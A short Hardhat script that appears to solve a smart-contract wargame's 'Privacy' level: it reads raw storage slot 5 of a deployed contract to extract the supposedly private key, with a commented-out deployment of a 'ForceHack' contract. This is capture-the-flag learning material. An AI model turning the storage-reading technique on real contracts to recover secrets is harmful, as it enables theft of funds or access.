const { ethers } = require("hardhat");
const hre = require("hardhat");

const main = async () => {
  /*const contractFactory = await hre.ethers.getContractFactory("ForceHack");
  const forceHack = await contractFactory.deploy();
  await forceHack.deployed();
  console.log("=== forceHack contract deployed to ", forceHack.address);
  */
  console.log("===CONNECTING===");
  const address = "0x68717Cffa2378F810e42fC552cAb55245dD0E8Cf";
  const name = "Privacy";
  const signer = await hre.ethers.getSigner();
  const contract = await hre.ethers.getContractAt(name, address, signer);
  console.log("===READING===");
  const pass = String(
    await hre.ethers.provider.getStorageAt(contract.address, 5)
  );
  console.log("slot 5 - data2 32bytes :", pass);
  console.log("length: ", pass.length);
  console.log("slot 5 - data2 16bytes :", pass.slice(0, pass.length / 2));

  console.log("=== DONE ===");
};

const runMain = (async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
})();
